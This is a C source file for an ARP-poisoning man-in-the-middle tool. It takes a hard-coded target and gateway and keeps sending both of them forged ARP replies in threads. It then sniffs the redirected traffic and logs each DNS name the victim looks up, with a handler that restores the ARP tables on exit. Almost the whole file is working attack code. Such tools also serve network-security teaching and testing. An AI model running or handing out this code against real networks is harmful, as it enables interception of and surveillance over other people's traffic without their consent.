#include "fantom.h"
#include <pthread.h>
#include <signal.h>

/* IPv4 Addresses and Interface Name */
char* target_ip = (char*)"192.168.0.10";
char* gateway_ip = (char*)"192.168.0.1";
char* interface = (char*)"wlp3s0";

/* Hardware Addresses */
macaddr target_mac;
macaddr gateway_mac;

/* Local Data structure */
LOCAL_NET_DATA lnd;

/* Sockets */
int arp_socket;
int sniffing_socket;

void* poison_target(void* param)
{
    printf("[*] ARP poisoning target with IPv4: %s\n", target_ip);

    while (1)
    {
        sleep(1);
        struct arp_packet pkt;
        craft_arp_packet(&pkt, strtoip(gateway_ip), lnd.mac_address, strtoip(target_ip), target_mac);
        send_arp_packet(arp_socket, lnd.interface_index, pkt);
    }
    return 0;
}

void* poison_gateway(void* param)
{
    printf("[*] ARP poisoning target with IPv4: %s\n", gateway_ip);

    while (1)
    {
        sleep(1);
        struct arp_packet pkt;
        craft_arp_packet(&pkt, strtoip(target_ip), lnd.mac_address, strtoip(gateway_ip), gateway_mac);
        send_arp_packet(arp_socket, lnd.interface_index, pkt);
    }
    return 0;
}

void cleanup(int sig)
{
    printf("\n[*] Re-Arping Targets . . . \n");

    for (int i = 0; i < 20; i++)
    {
        struct arp_packet pkt;
        craft_arp_packet(&pkt, strtoip(gateway_ip), gateway_mac, strtoip(target_ip), target_mac); // restoring target
        send_arp_packet(arp_socket, lnd.interface_index, pkt);
    }

    for (int i = 0; i < 20; i++)
    {
        struct arp_packet pkt;
        craft_arp_packet(&pkt, strtoip(target_ip), target_mac, strtoip(gateway_ip), gateway_mac); // restoring gateway
        send_arp_packet(arp_socket, lnd.interface_index, pkt);
    }

    close(arp_socket);
    close(sniffing_socket);
    printf("[*] Stopping Service [*]\n\n");
    exit(0);
}

uint8_t* EditPacket(uint8_t* pkt)
{
    if (has_dns_layer(pkt))
    {
        struct dns_layer dnsl = get_dns_layer(pkt);
        if (dnsl.qdcount == 1)
            printf("%s requested for %s\n", iptostr(get_ip_layer(pkt).src_addr), dnsl.qd.qname);
    }

    return pkt;
}

int main()
{
    arp_socket = create_arp_udp_socket();
    if (arp_socket == -1) return -1;

    // disabling ip forwarding (just in case it's on)
    system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward");
    signal(SIGINT, cleanup);

    lnd = get_local_net_data(interface, arp_socket);
    printf("\n======= Getting Local Data =======\n");
    printf("Interface       :  %s\n", lnd.interface_name);
    printf("Interface Index :  %d\n", lnd.interface_index);
    printf("MAC Address     :  "); print_mac_addr(lnd.mac_address); printf("\n");
    printf("IP address      :  %s\n\n", iptostr(lnd.ip_address));
    printf("[*] Sending out ARP requests . . . [*]\n");

    send_arp_request(arp_socket, lnd, strtoip(target_ip), &target_mac);
    printf("Target MAC   :  "); print_mac_addr(target_mac); printf("\n");

    send_arp_request(arp_socket, lnd, strtoip(gateway_ip), &gateway_mac);
    printf("Gateway MAC  :  "); print_mac_addr(gateway_mac); printf("\n\n");

    // Start arp poisoning target and gateway
    pthread_t target_thread, gateway_thread;
    pthread_create(&target_thread, NULL, poison_target, NULL);
    printf("\n");
    pthread_create(&gateway_thread, NULL, poison_gateway, NULL);

    sniffing_socket = create_sniffing_socket();
    register_packet_edit_callback(EditPacket);

    start_sniffing_loop(sniffing_socket, lnd, target_mac, gateway_mac);

    return 0;
}

